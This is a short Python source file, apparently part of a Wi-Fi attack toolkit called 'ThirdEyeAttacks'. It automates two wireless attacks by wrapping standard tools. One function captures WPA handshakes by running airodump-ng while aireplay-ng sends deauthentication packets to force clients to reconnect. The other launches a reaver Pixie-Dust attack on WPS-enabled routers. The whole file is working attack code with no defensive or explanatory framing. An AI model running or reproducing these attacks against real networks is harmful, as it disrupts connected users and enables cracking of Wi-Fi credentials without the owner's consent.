import os
import subprocess
import time
import signal
from colorama import Fore

class ThirdEyeAttacks:
    def __init__(self, interface):
        self.interface = interface

    def handshake_capture(self, bssid, channel, essid):
        """Captures WPA handshake by deauthenticating clients."""
        if not os.path.exists("captures"): os.makedirs("captures")
        out = f"captures/{essid.replace(' ', '_')}"
        
        print(Fore.CYAN + f"[*] Sniffing on {essid}...")
        sniff = subprocess.Popen(["sudo", "airodump-ng", "-c", channel, "--bssid", bssid, "-w", out, self.interface])
        
        time.sleep(3)
        print(Fore.RED + "[!] Sending Deauthentication packets to force client reconnection...")
        subprocess.run(["sudo", "aireplay-ng", "--deauth", "15", "-a", bssid, self.interface])
        
        print(Fore.YELLOW + "[*] Waiting for handshake packets...")
        time.sleep(12)
        os.kill(sniff.pid, signal.SIGTERM)
        print(Fore.GREEN + f"[+] Session finished. Check {out}-01.cap for handshake.")

    def wps_pixie(self, bssid):
        """Runs the Pixie-Dust attack for WPS-enabled routers."""
        print(Fore.MAGENTA + f"[*] Launching Pixie-Dust attack on {bssid}...")
        subprocess.run(["sudo", "reaver", "-i", self.interface, "-b", bssid, "-K", "1", "-vv"])
